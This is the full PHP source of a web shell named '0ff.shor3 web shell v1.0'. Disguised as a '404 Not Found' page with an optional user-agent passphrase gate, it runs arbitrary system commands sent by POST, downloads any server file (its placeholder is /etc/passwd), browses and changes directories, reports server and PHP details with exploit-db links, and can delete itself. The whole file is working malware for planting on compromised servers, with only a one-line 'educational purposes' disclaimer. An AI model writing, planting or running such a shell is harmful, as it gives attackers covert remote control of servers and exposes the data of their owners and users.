<?
$use_auth = FALSE; // TODO: switch to TRUE before use

error_reporting(0);

set_time_limit(0);

$shell = $_SERVER["PHP_SELF"];

header("Expires: Sun, 01 Jan 2000 00:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", FALSE);
header("Pragma: no-cache");

if ($use_auth)
{
	if ($_SERVER["HTTP_USER_AGENT"] != md5("LET_ME_IN")) // TODO: change pass-phrase before use
	{
		exit( sprintf("
			<h1>404 Not Found</h1>
			<p>The requested URL %s was not found on this server.</p>
			<hr>
			<p><i>%s Server: <b>%s</b> Port: <b>%s</b></i></p>
			",
			$_SERVER["REQUEST_URI"],
			$_SERVER["SERVER_SOFTWARE"],
			$_SERVER["SERVER_ADDR"],
			$_SERVER["SERVER_PORT"]
			)
		);
	}
}

if (isset($_POST["download"]))
{
	$file = $_POST["download"];

	if (file_exists($file))
	{
		header("Content-Length:" . filesize($file) . "");
		header("Content-Description: File Transfer");
		header("Content-Type: application/octet-stream");
		header('Content-Disposition: attachment; filename="' . $file . '"');
	
		flush();

		readfile($file);

		exit();
	}
}

if (isset($_POST["exec"]))
{
	$command = $_POST["exec"];

	$output = null;
	$result = null;
	$result_code = null;

	try {
		$result = exec($command, $output, $result_code);
	} catch (Error $e) {
		$result = $e;
	}
}

if (isset($_POST["dir"]))
{
	$dir = $_POST["dir"];

	if (is_dir($dir)) { chdir($dir); }
}

if (isset($_POST["kill"])) { unlink(__FILE__); }

echo( sprintf("
<!DOCTYPE html>

<html>

<head>
	<title>404 Not Found</title>

	<meta charset='utf-8' /> 
	<meta http-equiv='expires' content='Sun, 01 Jan 2000 00:00:00 GMT' />
	<meta http-equiv='pragma' content='no-cache' />

	<style>
	body {
		color: #c8c8c8; background-color: #323232;
	}
	a {
		color: #7b7b7b;
	}
	table {
		border-collapse: collapse;
	}
	td {
		padding: 4px;
	}
	th {
		text-align: left;
	}
	tr > td:nth-child(1) {
		color: #bcd05d;
	}
	tr:nth-child(odd) {
		background-color: #323232;
	}
	tr:nth-child(even) {
		background-color: #3c3c3c;
	}
	form {
		display: flex; align-items: center; gap: 8px; margin: 16px 0px;
	}
	</style>
</head>

<body>

<pre name='banner'>
 ▒█████    █████▒ █████▒       ██████  ██░ ██  ▒█████   ██▀███  ▓█████     █     █░▓█████  ▄▄▄▄        ██████  ██░ ██ ▓█████  ██▓     ██▓    
▒██▒  ██▒▓██   ▒▓██   ▒      ▒██    ▒ ▓██░ ██▒▒██▒  ██▒▓██ ▒ ██▒▓█   ▀    ▓█░ █ ░█░▓█   ▀ ▓█████▄    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██░  ██▒▒████ ░▒████ ░      ░ ▓██▄   ▒██▀▀██░▒██░  ██▒▓██ ░▄█ ▒▒███      ▒█░ █ ░█ ▒███   ▒██▒ ▄██   ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒██   ██░░▓█▒  ░░▓█▒  ░        ▒   ██▒░▓█ ░██ ▒██   ██░▒██▀▀█▄  ▒▓█  ▄    ░█░ █ ░█ ▒▓█  ▄ ▒██░█▀       ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░ ████▓▒░░▒█░   ░▒█░     ██▓ ▒██████▒▒░▓█▒░██▓░ ████▓▒░░██▓ ▒██▒░▒████▒   ░░██▒██▓ ░▒████▒░▓█  ▀█▓   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒░▒░▒░  ▒ ░    ▒ ░     ▒▓▒ ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ▒░ ░   ░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░ ▒ ▒░  ░      ░       ░▒  ░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░▒ ░ ▒░ ░ ░  ░     ▒ ░ ░   ░ ░  ░▒░▒   ░    ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
░ ░ ░ ▒   ░ ░    ░ ░     ░   ░  ░  ░   ░  ░░ ░░ ░ ░ ▒    ░░   ░    ░        ░   ░     ░    ░    ░    ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
    ░ ░                   ░        ░   ░  ░  ░    ░ ░     ░        ░  ░       ░       ░  ░ ░               ░   ░  ░  ░   ░  ░    ░  ░    ░  ░

0ff.shor3 web shell v1.0 | dev: @sug4r-wr41th | Fair Use disclaimer: for educational purposes only.
</pre>

	<script>
	window.onload = function()
	{
		const list = document.getElementsByTagName('b');

		for (const e of list)
		{
			if (e.textContent == 'ON') { e.style.color = 'green'; } 
			if (e.textContent == 'OFF') { e.style.color = 'red'; } 
		}
	}
	</script>

	<table>
		<tr><td>Your IP</td><td>%s</td></tr>
		<tr><td>Status</td><td>Connected! @ %s : %s</td></tr>
		<tr><td>Date Time</td><td>%s</td></tr>
		<tr><td>User</td><td>%s</td></tr>
		<tr><td>Group</td><td>%s</td></tr>
		<tr><td>System</td><td>%s</td></tr>
		<tr><td>PHP Info</td><td>%s | Safe Mode: <b>%s</b> Magic Quotes: <b>%s</b> | Error Reporting Level: <b>%s</b> | Disable Functions: <b>%s</b> <a href='https://www.php.net/manual/en/ini.core.php#ini.disable-functions' target='_blank'>[php.net]</a></td></tr>
		<tr><td>PHP Extensions</td><td>cURL: <b>%s</b> rar: <b>%s</b> zip: <b>%s</b> | MySQL/MariaDB: <b>%s</b> MongoDB: <b>%s</b> PostgreSQL: <b>%s</b> | SSH2: <b>%s</b> FTP: <b>%s</b></td></tr>
		<tr><td>Current Directory</td><td>%s</td></tr>
		<tr><td>Free / Total disk space</td><td>%sGB / %sGB</td></tr>
	</table>
	",
	$_SERVER["REMOTE_ADDR"],
	$_SERVER["SERVER_ADDR"],
	$_SERVER["SERVER_PORT"],
	date("Y-m-d H:i:s"),
	sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(posix_getuid())["name"]),
	sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(posix_getgid())["name"]),
	implode(" ", posix_uname()),
	PHP_VERSION . " <a href='https://www.exploit-db.com/search?q=PHP' target='_blank'>[exploit-db]</a>",
	((int) ini_get("safe_mode")) ? "ON": "OFF",
	(function_exists("get_magic_quotes_runtime") AND get_magic_quotes_runtime()) ? "ON" : "OFF",
	error_reporting(),
	ini_get("disable_functions") == "" ? "none" : ini_get("disable_functions"),
	extension_loaded("curl") ? "ON" : "OFF",
	extension_loaded("rar") ? "ON" : "OFF",
	extension_loaded("zip") ? "ON" : "OFF",

	extension_loaded("mysqli") ? "ON" : "OFF",
	extension_loaded("mongodb") ? "ON" : "OFF",
	extension_loaded("pgsql") ? "ON" : "OFF",

	extension_loaded("ssh2") ? "ON" : "OFF",
	extension_loaded("ftp") ? "ON" : "OFF",
	posix_getcwd(),
	round(disk_free_space("/") / 1024 / 1024 / 1024, 2),
	round(disk_total_space("/") / 1024 / 1024 / 1024, 2)
	)
);
?>

<form action="<? echo($shell); ?>" method="POST">
	<label for="download">File:</label>
	<input type="text" id="download" name="download" placeholder="/etc/passwd">
	<input type="submit" value="Download">
	<b>Info:</b> enter full file path.
</form>

<form action="<? echo($shell); ?>" method="POST">
	<label for="exec">Command:</label>
	<input type="text" id="exec" name="exec" placeholder="ls -ls">
	<input type="submit" value="Execute">
</form>

<textarea rows="4" cols="64"><?php
if (isset($result))
{
	if (is_object($result)) { echo("[-] error: command contains null bytes"); }
	if (is_bool($result)) { echo("[-] error: command not found"); }

	if (is_string($result)) { echo(implode("\n", $output)); }
}
?></textarea>

<form action="<? echo($shell); ?>" method="POST">
	<input type="hidden" id="kill" name="kill">
	<input type="submit" value="Remove Shell">
	<b>Warning!</b> You'll forever lose access to the shell. This action can't be undone.
</form>

<h1>File Manager</h1>

<?php
$cwd = getcwd();

if ($cwd)
{
	$files = scandir($cwd);

	?>
	<table>
		<tr>
			<th>Name</th>
			<th>Size</th>
			<th>Creation Date</th>
			<th>Last Modified</th>
			<th>Owner / Group</th>
			<th>Permissions</th>
		</tr>
		<?php
		foreach ($files as &$f)
		{
			$perms = fileperms($f);

			switch ($perms & 0xF000) {
					case 0xC000:
							$info = 's';
							break;
					case 0xA000:
							$info = 'l';
							break;
					case 0x8000:
							$info = 'r';
							break;
					case 0x6000:
							$info = 'b';
							break;
					case 0x4000:
							$info = 'd';
							break;
					case 0x2000:
							$info = 'c';
							break;
					case 0x1000:
							$info = 'p';
							break;
					default:
							$info = 'u';
			}

			$info .= " | ";
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
									(($perms & 0x0800) ? 's' : 'x' ) :
									(($perms & 0x0800) ? 'S' : '-'));

			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
									(($perms & 0x0400) ? 's' : 'x' ) :
									(($perms & 0x0400) ? 'S' : '-'));

			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
									(($perms & 0x0200) ? 't' : 'x' ) :
									(($perms & 0x0200) ? 'T' : '-'));

			echo( sprintf("<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%s / %s</td><td>%s</td></tr>",
				$f,
				is_file($f) ? filesize($f) : "dir", 
				date(DATE_RFC2822, filectime($f)),
				date(DATE_RFC2822, filemtime($f)),
				sprintf("%s ( %s )", posix_getuid(), posix_getpwuid(fileowner($f))["name"]),
				sprintf("%s ( %s )", posix_getgid(), posix_getgrgid(filegroup($f))["name"]),
				$info
				) 
			);
		}
		?>
	</table>
	<?php
}
?>

<form action="<? echo($shell); ?>" method="POST">
	<label for="dir">Change Directory:</label>
	<input type="text" id="dir" name="dir" placeholder="..">
	<input type="submit" value="Change Directory">
</form>

</body></html>